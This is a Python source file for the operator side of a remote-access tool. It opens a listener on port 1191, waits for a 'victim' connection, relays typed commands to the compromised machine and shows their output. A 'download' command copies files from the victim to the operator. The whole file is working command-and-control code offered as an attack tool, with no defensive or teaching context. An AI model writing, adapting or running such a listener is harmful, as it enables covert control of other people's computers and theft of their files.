from assets.leonResources import color,custom_output,user_input,banner
import socket
banner.leonBanner()
ip_address=''
port=1191
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
server.bind((ip_address,port))
custom_output.info("[+]server started",color.green)
custom_output.info("listening for victim connction...",color.green)
server.listen(1)
client,client_add=server.accept()
custom_output.info(f'[+]{client_add} connected succefully',color.cyan)

while True:
    output=client.recv(1024)
    output=output.decode()
    command=user_input.useruput(f'{output}: ')
    command=command.encode()
    if command.decode().split()[0]=="download":
        client.send(command)
        output=client.recv(1024)
        output=output.decode()
        if output!="NO":
            filename=command.split()[1]
            with open(filename,'wb') as f:
                data=client.recv(1024)
                while data:
                    f.write(data)
                    data=client.recv(1024)
                    if data==b"DONE":
                        custom_output.error(f"file transferred successfully")
                        break
        else:
            custom_output.error(f"file not found")
    else:
        client.send(command)
        # custom_output.info("[+] command sent",color.green)
        output=client.recv(1024)
        output=output.decode()
        custom_output.info(f"{output}",color.blue)